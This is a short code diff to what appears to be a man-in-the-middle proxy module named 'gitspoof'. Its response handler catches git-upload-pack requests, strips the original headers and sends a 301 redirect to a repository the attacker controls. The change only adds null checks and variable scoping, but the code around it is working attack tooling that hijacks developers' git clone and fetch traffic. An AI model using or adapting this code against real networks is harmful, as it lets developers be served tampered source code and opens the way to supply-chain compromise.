@@ -18,10 +18,14 @@ function onResponse(req, res) {
     }
     if (req.Query == 'service=git-upload-pack' && req.Hostname != gitspoof_repo) {
         res.Status = 301;
-        headers = res.Headers.split("\r\n");
-        for (var i = 0; i < headers.length; i++) {
-            header_name = headers[i].replace(/:.*/, "");
-            res.RemoveHeader(header_name);
+        if (res.Headers) {
+            var headers = res.Headers.split("\r\n");
+            for (var i = 0; i < headers.length; i++) {
+                if (headers[i]) {
+                    var header_name = headers[i].replace(/:.*/, "");
+                    res.RemoveHeader(header_name);
+                }
+            }
         }
         res.SetHeader("Location", "http://" + gitspoof_repo + "/info/refs?service=git-upload-pack");
         res.Body = "";
